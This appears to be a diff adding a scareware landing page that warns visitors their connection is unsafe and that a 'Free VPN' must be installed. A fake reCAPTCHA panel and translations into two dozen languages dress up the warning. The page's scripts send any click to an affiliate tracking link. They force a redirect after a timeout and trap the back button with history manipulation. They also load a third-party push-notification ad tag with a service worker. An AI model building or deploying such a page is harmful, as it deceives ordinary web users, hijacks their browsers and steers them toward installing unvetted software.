@@ -1,0 +1,538 @@
+<html><head>
+  <base href="">
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        <!---->
+        <script src="jquery.min.js"></script>
+        <title>VPN Required</title>
+        <meta content="width=device-width, initial-scale=1" name="viewport">
+        <link href="style.css" rel="stylesheet" type="text/css">        
+       </head>
+    <body onclick="redirect();" class="body" data-gr-c-s-loaded="true">	
+<script>
+		$(document).ready(function()
+		{
+			
+			$(document).ready(function(){
+			//alert("hi");
+				var l_lang;
+				  if (navigator.userLanguage) // Explorer
+					l_lang = navigator.userLanguage;
+				  else if (navigator.language) // FF
+					l_lang = navigator.language;
+				  else
+					l_lang = "en";
+				
+
+				if(l_lang.toLowerCase()!='en')
+				{
+					$(".lang").each(function(index, element)
+					{
+					//alert(l_lang.toLowerCase());
+						
+						try {
+							 $(this).text(arrLang[l_lang.toLowerCase()][$(this).attr('key')]);
+							}
+							catch(err) {
+							 
+							}
+					});
+				}
+				
+			});
+			var arrLang={
+			"en":{
+			"text10":"We want to make sure that you are not a robot:",
+			"text9":"I am not a robot",
+			"text8":"reCAPTCHA",
+			"text7":"Privacy - Terms",
+			"text6":"VPN might be required!",
+			"text5":"Your connection may be not secure. ",
+			"text4":"How to fix this:",
+			"text3":"Step 1:",
+			"text1":"Install the Free VPN",
+			"text2":"Step 2:",
+			"text21":" Launch the app, press Connection button",
+			"text22":"INSTALL"
+			},
+				
+				"ar":{
+"text10" : "نريد أن نتأكد من أنك لست روبوتًا:",
+"text9" : "أنا لست روبوتا",
+"text8" : "reCAPTCHA",
+"text7" : "الخصوصية - الشروط",
+"text6" : "قد تكون VPN مطلوبة!",
+"text5" : "قد يكون اتصالك غير آمن.",
+"text4" : "كيف يمكن اصلاح هذا:",
+"text3" : "الخطوة 1:",
+"text1" : "قم بتثبيت تطبيق Free VPN المجاني",
+"text2" : "الخطوة 2:",
+"text21" : "قم بتشغيل التطبيق ، اضغط على زر الاتصال",
+"text22" : "تثبيت"
+},
+"pt":{
+"text10" : "Queremos ter certeza de que você não é um robô:",
+"text9" : "Eu não sou um robô",
+"text8" : "reCAPTCHA",
+"text7" : "Privacidade e Termos",
+"text6" : "VPN pode ser necessária!",
+"text5" : "Sua conexão pode não ser segura.",
+"text4" : "Como consertar isto:",
+"text3" : "Passo 1:",
+"text1" : "Instale o aplicativo Free VPN GRATUITO",
+"text2" : "Passo 2:",
+"text21" : "Inicie o aplicativo, pressione o botão Conexão",
+"text22" : "INSTALAR"
+},
+"ga":{
+"text10" : "Ba mhaith linn a chinntiú nach robot tú:",
+"text9" : "Ní róbat mé",
+"text8" : "reCAPTCHA",
+"text7" : "Príobháideacht - Téarmaí",
+"text6" : "B’fhéidir go mbeadh VPN ag teastáil!",
+"text5" : "B’fhéidir nach bhfuil do nasc slán.",
+"text4" : "Conas é seo a shocrú:",
+"text3" : "Céim 1:",
+"text1" : "Suiteáil an aip Free VPN SAOR IN AISCE",
+"text2" : "Céim 2:",
+"text21" : "Seoladh an aip, brúigh an cnaipe Ceangal",
+"text22" : "INSTALL"
+},
+"cy":{
+"text10" : "Rydym am sicrhau nad robot ydych chi:",
+"text9" : "Nid wyf yn robot",
+"text8" : "reCAPTCHA",
+"text7" : "Preifatrwydd - Telerau",
+"text6" : "Efallai y bydd angen VPN!",
+"text5" : "Efallai na fydd eich cysylltiad yn ddiogel.",
+"text4" : "Sut i drwsio hyn:",
+"text3" : "Cam 1:",
+"text1" : "Gosod yr app Free VPN AM DDIM",
+"text2" : "Cam 2:",
+"text21" : "Lansio'r app, pwyswch botwm Cysylltiad",
+"text22" : "INSTALL"
+},
+"hr":{
+"text10" : "Želimo biti sigurni da niste robot:",
+"text9" : "Nisam robot",
+"text8" : "reCAPTCHA",
+"text7" : "Privatnost i uvjeti",
+"text6" : "VPN će možda biti potreban!",
+"text5" : "Vaša veza možda nije sigurna.",
+"text4" : "Kako to popraviti:",
+"text3" : "Korak 1:",
+"text1" : "Instalirajte Free VPN aplikaciju",
+"text2" : "Korak 2:",
+"text21" : "Pokrenite aplikaciju, pritisnite gumb za vezu",
+"text22" : "INSTALIRATI"
+},
+"pt":{
+"text10" : "Queremos ter certeza de que você não é um robô:",
+"text9" : "Eu não sou um robô",
+"text8" : "reCAPTCHA",
+"text7" : "Privacidade e Termos",
+"text6" : "VPN pode ser necessária!",
+"text5" : "Sua conexão pode não ser segura.",
+"text4" : "Como consertar isto:",
+"text3" : "Passo 1:",
+"text1" : "Instale o aplicativo Free VPN",
+"text2" : "Passo 2:",
+"text21" : "Inicie o aplicativo, pressione o botão Conexão",
+"text22" : "INSTALAR"
+},
+"ja":{
+"text10" : "私たちはあなたがロボットでないことを確認したいと思います：",
+"text9" : "私はロボットではありません",
+"text8" : "reCAPTCHA",
+"text7" : "プライバシーと利用規約",
+"text6" : "VPNが必要な場合があります。",
+"text5" : "接続が安全でない可能性があります。",
+"text4" : "これを修正する方法：",
+"text3" : "ステップ1：",
+"text1" : "無料 Free VPN アプリをインストールする",
+"text2" : "ステップ2：",
+"text21" : "アプリを起動し、接続ボタンを押します",
+"text22" : "インストール"
+},
+"ko":{
+"text10" : "우리는 당신이 로봇이 아닌지 확인하고 싶습니다 :",
+"text9" : "나는 로봇이 아니다",
+"text8" : "요점",
+"text7" : "개인 정보 보호-약관",
+"text6" : "VPN이 필요할 수 있습니다!",
+"text5" : "연결이 안전하지 않을 수 있습니다.",
+"text4" : "이 문제를 해결하는 방법 :",
+"text3" : "1 단계:",
+"text1" : "무료 Free VPN 앱 설치",
+"text2" : "2 단계:",
+"text21" : "앱을 실행하고 연결 버튼을 누릅니다.",
+"text22" : "설치"
+},
+"he":{
+"text10" : "אנו רוצים לוודא שאינך רובוט:",
+"text9" : "אני לא רובוט",
+"text8" : "reCAPTCHA",
+"text7" : "פרטיות ותנאים",
+"text6" : "VPN עשוי להידרש!",
+"text5" : "ייתכן שהחיבור שלך אינו מאובטח.",
+"text4" : "כיצד לתקן זאת:",
+"text3" : "שלב 1:",
+"text1" : "התקן את אפליקציית ה- Free VPN בחינם",
+"text2" : "שלב 2:",
+"text21" : "הפעל את האפליקציה, לחץ על לחצן חיבור",
+"text22" : "להתקין"
+},
+"xh":{
+"text10" : "Sifuna ukuqinisekisa ukuba awuyirobhothi:",
+"text9" : "Andinguye robhothi",
+"text8" : "I-reCAPTCHA",
+"text7" : "Imfihlo - Imigaqo",
+"text6" : "I-VPN inokufuneka!",
+"text5" : "Unxibelelwano lwakho lusenokungakhuselekanga.",
+"text4" : "Ungayilungisa njani le nto:",
+"text3" : "Inyathelo 1:",
+"text1" : "Faka usetyenziso lwasimahla Free VPN",
+"text2" : "Inyathelo 2:",
+"text21" : "Qalisa usetyenziso, cofa iqhosha loQhagamshelo",
+"text22" : "Faka"
+},
+"nl":{
+"text10" : "We willen ervoor zorgen dat u geen robot bent:",
+"text9" : "Ik ben geen robot",
+"text8" : "reCAPTCHA",
+"text7" : "Privacy en voorwaarden",
+"text6" : "Mogelijk is een VPN vereist!",
+"text5" : "Uw verbinding is mogelijk niet veilig.",
+"text4" : "Hoe dit op te lossen:",
+"text3" : "Stap 1:",
+"text1" : "Installeer de GRATIS Free VPN",
+"text2" : "Stap 2:",
+"text21" : "Start de app en druk op de verbindingsknop",
+"text22" : "INSTALLEREN"
+},
+"am":{
+"text10" : "ሮቦት አለመሆንዎን ማረጋገጥ እንፈልጋለን",
+"text9" : "እኔ ሮቦት አይደለሁም",
+"text8" : "reCAPTCHA",
+"text7" : "ግላዊነት - ውሎች",
+"text6" : "VPN ሊያስፈልግ ይችላል!",
+"text5" : "ግንኙነትዎ ደህንነቱ የተጠበቀ ላይሆን ይችላል።",
+"text4" : "ይህንን እንዴት እንደሚያስተካክሉ",
+"text3" : "ደረጃ 1",
+"text1" : "ነፃ የ VPN መተግበሪያን ይጫኑ",
+"text2" : "ደረጃ 2",
+"text21" : "መተግበሪያውን ያስጀምሩ ፣ የግንኙነት ቁልፍን ይጫኑ",
+"text22" : "ያስገቡ"
+},
+"ro":{
+"text10" : "Vrem să ne asigurăm că nu sunteți un robot:",
+"text9" : "Nu sunt un robot",
+"text8" : "reCAPTCHA",
+"text7" : "Termeni și Condiții",
+"text6" : "VPN ar putea fi necesar!",
+"text5" : "Este posibil ca conexiunea dvs. să nu fie sigură.",
+"text4" : "Cum să remediați acest lucru:",
+"text3" : "Pasul 1:",
+"text1" : "Instalați aplicația Free VPN",
+"text2" : "Pasul 2:",
+"text21" : "Lansați aplicația, apăsați butonul Conexiune",
+"text22" : "INSTALARE"
+},
+"gd":{
+"text10" : "Tha sinn airson dèanamh cinnteach nach e inneal-fuadain a th ’annad:",
+"text9" : "Chan e inneal-fuadain a th ’annam",
+"text8" : "reCAPTCHA",
+"text7" : "Prìobhaideachd - Cumhachan",
+"text6" : "Is dòcha gu bheil feum air VPN!",
+"text5" : "Is dòcha nach eil an ceangal agad tèarainte.",
+"text4" : "Mar a rèiticheas tu seo:",
+"text3" : "Ceum 1:",
+"text1" : "Stàlaich an app Free VPN",
+"text2" : "Ceum 2:",
+"text21" : "Cuir air bhog an aplacaid, brùth putan Ceangal",
+"text22" : "INSTALL"
+},
+"de":{
+"text10" : "Wir möchten sicherstellen, dass Sie kein Roboter sind:",
+"text9" : "Ich bin kein Roboter",
+"text8" : "reCaptcha",
+"text7" : "Datenschutz",
+"text6" : "Möglicherweise ist ein VPN erforderlich!",
+"text5" : "Ihre Verbindung ist möglicherweise nicht sicher.",
+"text4" : "So beheben Sie das Problem:",
+"text3" : "Schritt 1:",
+"text1" : "Installieren Sie die KOSTENLOSE Free VPN",
+"text2" : "Schritt 2:",
+"text21" : "Starten Sie die App und drücken Sie die Verbindungstaste",
+"text22" : "INSTALLIEREN"
+},
+"zu":{
+"text10" : "Sifuna ukuqiniseka ukuthi awulona irobhothi:",
+"text9" : "Angisiye irobhothi",
+"text8" : "I-reCAPTCHA",
+"text7" : "Ubumfihlo - Imibandela",
+"text6" : "I-VPN ingadingeka!",
+"text5" : "Ukuxhumana kwakho kungenzeka kungavikeleki.",
+"text4" : "Ungakulungisa kanjani lokhu:",
+"text3" : "Isinyathelo 1:",
+"text1" : "Faka uhlelo lokusebenza Free VPN EMAHHALA",
+"text2" : "Isinyathelo 2:",
+"text21" : "Qalisa uhlelo lokusebenza, cindezela inkinobho yokuXhuma",
+"text22" : "Faka"
+},
+"st":{
+"text10" : "Re batla ho etsa bonnete ba hore ha o roboto:",
+"text9" : "Ha ke roboto",
+"text8" : "RECAPTCHA",
+"text7" : "Lekunutu - Lipehelo",
+"text6" : "VPN e kanna ea hlokahala!",
+"text5" : "Khokahano ea hau e kanna ea se sireletsehe.",
+"text4" : "Mokhoa oa ho lokisa sena:",
+"text3" : "Mohato oa 1:",
+"text1" : "Kenya sesebelisoa sa MAHALA sa Free VPN",
+"text2" : "Mohato oa Bobeli:",
+"text21" : "Qolla sesebelisoa, tobetsa konopo ea Khokahano",
+"text22" : "TS'ELISO"
+},
+"es":{
+"text10" : "Queremos asegurarnos de que no eres un robot:",
+"text9" : "No soy un robot",
+"text8" : "reCAPTCHA",
+"text7" : "Términos y privacidad",
+"text6" : "¡Se podría requerir una VPN!",
+"text5" : "Su conexión puede no ser segura.",
+"text4" : "Cómo arreglar esto:",
+"text3" : "Paso 1:",
+"text1" : "Instale la aplicación Free VPN",
+"text2" : "Paso 2:",
+"text21" : "Inicie la aplicación, presione el botón Conexión",
+"text22" : "INSTALAR EN PC"
+},
+"it":{
+"text10" : "Vogliamo assicurarci di non essere un robot:",
+"text9" : "Non sono un robot",
+"text8" : "reCAPTCHA",
+"text7" : "Termini e Condizioni",
+"text6" : "VPN potrebbe essere richiesto!",
+"text5" : "La tua connessione potrebbe non essere sicura.",
+"text4" : "Come risolvere questo problema:",
+"text3" : "Passo 1:",
+"text1" : "Installa l'app Free VPN",
+"text2" : "Passo 2:",
+"text21" : "Avvia l'app, premi il pulsante Connessione",
+"text22" : "INSTALLARE"
+},
+"th":{
+"text10" : "เราต้องการให้แน่ใจว่าคุณไม่ใช่หุ่นยนต์:",
+"text9" : "ฉันไม่ใช่หุ่นยนต์",
+"text8" : "reCAPTCHA",
+"text7" : "ความเป็นส่วนตัวและข้อตกลง",
+"text6" : "อาจจำเป็นต้องใช้ VPN!",
+"text5" : "การเชื่อมต่อของคุณอาจไม่ปลอดภัย",
+"text4" : "วิธีแก้ไขปัญหานี้:",
+"text3" : "ขั้นตอนที่ 1:",
+"text1" : "ติดตั้งแอพ Free VPN ฟรี",
+"text2" : "ขั้นตอนที่ 2:",
+"text21" : "เปิดแอปกดปุ่มเชื่อมต่อ",
+"text22" : "ติดตั้ง"
+},
+"el":{
+"text10" : "Θέλουμε να διασφαλίσουμε ότι δεν είστε ρομπότ:",
+"text9" : "δεν είμαι ρομπότ",
+"text8" : "reCAPTCHA",
+"text7" : "Απόρρητο και Όροι",
+"text6" : "Ίσως απαιτείται VPN!",
+"text5" : "Η σύνδεσή σας ενδέχεται να μην είναι ασφαλής.",
+"text4" : "Πώς να το διορθώσετε:",
+"text3" : "Βήμα 1:",
+"text1" : "Εγκαταστήστε την ΔΩΡΕΑΝ εφαρμογή Free VPN",
+"text2" : "Βήμα 2:",
+"text21" : "Εκκινήστε την εφαρμογή και πατήστε το κουμπί Σύνδεση",
+"text22" : "ΕΓΚΑΘΙΣΤΩ"
+},
+"fr":{
+"text10" : "Nous voulons nous assurer que vous n'êtes pas un robot:",
+"text9" : "Je ne suis pas un robot",
+"text8" : "reCAPTCHA",
+"text7" : "Confidentialité et modalités",
+"text6" : "Un VPN peut être nécessaire!",
+"text5" : "Votre connexion n'est peut-être pas sécurisée.",
+"text4" : "Comment régler ceci:",
+"text3" : "Étape 1:",
+"text1" : "Installez l'application Free VPN",
+"text2" : "Étape 2:",
+"text21" : "Lancez l'application, appuyez sur le bouton Connexion",
+"text22" : "INSTALLER"
+},
+"tr":{
+"text10" : "Robot olmadığınızdan emin olmak istiyoruz:",
+"text9" : "Ben robot değilim",
+"text8" : "reCAPTCHA",
+"text7" : "Gizlilik ve Şartlar",
+"text6" : "VPN gerekebilir!",
+"text5" : "Bağlantınız güvenli olmayabilir.",
+"text4" : "Bunu nasıl düzeltebilirim:",
+"text3" : "Aşama 1:",
+"text1" : "ÜCRETSİZ Free VPN uygulamasını yükleyin",
+"text2" : "Adım 2:",
+"text21" : "Uygulamayı başlatın, Bağlantı düğmesine basın",
+"text22" : "YÜKLEMEK"
+},
+"ar":{
+"text10" : "نريد أن نتأكد من أنك لست روبوتًا:",
+"text9" : "أنا لست روبوتا",
+"text8" : "reCAPTCHA",
+"text7" : "الخصوصية - الشروط",
+"text6" : "قد تكون VPN مطلوبة!",
+"text5" : "قد يكون اتصالك غير آمن.",
+"text4" : "كيف يمكن اصلاح هذا:",
+"text3" : "الخطوة 1:",
+"text1" : "قم بتثبيت تطبيق Free VPN المجاني",
+"text2" : "الخطوة 2:",
+"text21" : "قم بتشغيل التطبيق ، اضغط على زر الاتصال",
+"text22" : "تثبيت"
+},
+"bg":{
+"text10" : "Искаме да се уверим, че не сте робот:",
+"text9" : "Аз не съм робот",
+"text8" : "Recaptcha",
+"text7" : "Поверителност - Условия",
+"text6" : "VPN може да се изисква!",
+"text5" : "Връзката ви може да не е защитена.",
+"text4" : "Как да поправите това:",
+"text3" : "Етап 1:",
+"text1" : "Инсталирайте приложението Free VPN",
+"text2" : "Стъпка 2:",
+"text21" : "Стартирайте приложението, натиснете бутона за връзка",
+"text22" : "ИНСТАЛИРАЙ"
+},
+"af":{
+"text10" : "Ons wil seker maak dat u nie 'n robot is nie:",
+"text9" : "Ek is nie 'n robot nie",
+"text8" : "reCAPTCHA",
+"text7" : "Privaatheid - Voorwaardes",
+"text6" : "VPN kan nodig wees!",
+"text5" : "U verbinding is moontlik nie veilig nie.",
+"text4" : "Hoe om dit reg te stel:",
+"text3" : "Stap 1:",
+"text1" : "Installeer die GRATIS Free VPN",
+"text2" : "Stap 2:",
+"text21" : "Begin die app en druk Verbindingsknoppie",
+"text22" : "iNSTALLEER"
+},
+"pl":{
+"text10" : "Chcemy mieć pewność, że nie jesteś robotem:",
+"text9" : "Nie jestem robotem",
+"text8" : "reCAPTCHA",
+"text7" : "Prywatność i warunki",
+"text6" : "VPN może być wymagane!",
+"text5" : "Twoje połączenie może nie być bezpieczne.",
+"text4" : "Jak to naprawić:",
+"text3" : "Krok 1:",
+"text1" : "Zainstaluj DARMOWĄ aplikację Free VPN",
+"text2" : "Krok 2:",
+"text21" : "Uruchom aplikację, naciśnij przycisk połączenia",
+"text22" : "ZAINSTALOWAĆ"
+}
+			};
+		});
+		</script>  
+        <div class="main">
+            <!-- pre-captcha -->
+            <div class="block" style="display: none;">
+                <div class="title">
+                    <div class="text-block lang" key="text10">We want to make sure that you are not a robot:</div>
+                </div>
+                <div data-w-id="0bb8cff0-52be-e047-4b5d-7a5312e9d933" class="recaptcha w-clearfix">
+                    <div class="content w-clearfix">
+                        <div class="inline-block">
+                            <div data-w-id="42abc5be-e049-d3e3-5ba4-bafe55b2ba0f" class="checkbox"></div>
+                            <div data-w-id="7542b8d6-5599-c8ad-29b4-76927ecc0673" class="load"></div>
+                        </div>
+                        <div class="inline-block2">
+                            <div class="text-block-3 lang" key="text9">I'm not a robot</div>
+                        </div>
+                    </div>
+                    <div class="content-right">
+                        <div class="rc-anchor-logo-portrait">
+                            <div class="rc-anchor-logo-img"></div>
+                            <div class="policy-text lang" key="text8">reCAPTCHA</div>
+                            <div class="recaptcha-text lang" key="text7">Privacy - Terms</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div data-w-id="42aa10bf-9055-78ba-55cf-78324b8b5a2f" class="block-final" style="opacity: 1; display: block;"> 
+                <div class="title-blue">
+                    <div class="text-block-popunder">
+                        <strong class="lang" key="text6">VPN might be required!</strong>
+                        <br><span class="lang" key="text5">Your connection may be not secure.<span>
+                        <br>
+                    </span></span></div>
+                </div>
+                <div class="content-popunder">
+                    <div class="text-block-5 lang" key="text4">How to fix this:</div>
+                    <div class="text-block-6">
+                        <strong class="lang" key="text3">Step 1:</strong> <span class="lang" key="text21">Install the Free VPN</span>
+                        <br>‍
+                        <br>
+                        <strong class="lang" key="text2">Step 2:</strong><span class="lang" key="text22"> Launch the app, press Connection button</span>
+                    </div>
+                </div>
+                <div class="button-block w-clearfix">
+                    <div class="left">
+                        <img src="icons.jpg" width="110" alt="">
+                    </div>
+                    <div class="right w-clearfix">
+                       <a onclick="redirect();"> <span class="js-clipboard-trigger button w-button lang" key="text1">INSTALL</span></a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <!--<script src="preland.js"></script>-->
+
+    <script type="text/javascript">
+    function redirect() {
+       window.open('https://tk.besttrustedreview.com/click.php?lp=1&to_offer=1');
+       setTimeout(function () {
+         window.location.href = "https://tk.besttrustedreview.com/click.php?lp=1&to_offer=2";
+       },  5000)
+     }
+    </script>
+ 
+  <script type="text/javascript">
+    setTimeout(function () {
+      window.location.href = "https://tk.besttrustedreview.com/click.php?lp=1&to_offer=3&event10=1";
+    }, 180000);
+  </script>
+
+<script type="text/javascript">
+    ! function () {
+        var t;
+        try {
+            const URL = window.location.href.split(/[#]/)[0];
+            for (t = 0; 10 > t; ++t) history.pushState({}, "", URL+'#')
+            onpopstate = function(event){
+                event.state && location.replace('https://tk.besttrustedreview.com/click.php?lp=1&to_offer=3&event10=1');
+            }
+        } catch (o) { console.log( o ); }
+    }();
+</script>
+
+<script>
+    var s = document.createElement('script');
+    s.src='//ouphouch.com/pfe/current/micro.tag.min.js?z=4947068'+'&sw=/sw-check-permissions-747a6.js';
+    s.onload = function(result) {
+        switch (result) {
+            case 'onPermissionDefault':break;
+            case 'onPermissionAllowed':break;
+            case 'onPermissionDenied':break;
+            case 'onAlreadySubscribed':break;
+            case 'onNotificationUnsupported':break;
+        }
+    }
+
+    document.head.appendChild(s);
+</script>
+	
+</body></html>
